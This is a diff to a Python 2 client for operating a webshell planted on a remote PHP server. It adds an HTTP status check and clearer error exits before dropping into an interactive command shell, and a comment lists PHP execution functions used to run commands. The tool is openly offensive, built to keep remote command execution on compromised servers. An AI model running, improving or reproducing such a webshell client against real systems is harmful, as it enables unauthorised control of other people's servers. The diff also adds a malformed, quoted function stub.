@@ -27,12 +27,13 @@ def
 
 '''
 
-
-
-
+'''
+def get_disabled_function():
+'''
 
 def init(url, method, auth):
     return ""
+
 
 def shell_exec(url, method, auth, command):
     # system, exec, shell_exec, popen, proc_open, passthru
@@ -100,6 +101,13 @@ def build_url(url, params):
         url += "%s=%s&" % (key, url_encode(value))
     return url[0:-1]
 
+def check_status_code(url):
+    try:
+        response = requests.head(url)
+        return response.status_code
+    except:
+        return False
+
 def main():
     if len(sys.argv) != 4:
         print "Usage : "
@@ -117,11 +125,17 @@ def main():
     print "    METHOD : %s" % (method)
     print "    AUTH : %s" % (auth)
     print "[+] Connecting..."
-    if check_working(url, method, auth):
-        print "[+] Your webshell is working well!"
-        shell(url, method, auth)
-    else:
+    print "[+] Checking status code..."
+    status = check_status_code(url)
+    if status == False:
+        print "[-] Connect error! Maybe server has been down!"
+        exit(2)
+    print "[+] Status Code : %d" % (status)
+    if check_working(url, method, auth) == False:
         print "[+] The webshell maybe invaild! Check your configuration!"
+        exit(3)
+    print "[+] Your webshell is working well!"
+    shell(url, method, auth)
 
 if __name__ == "__main__":
     main()
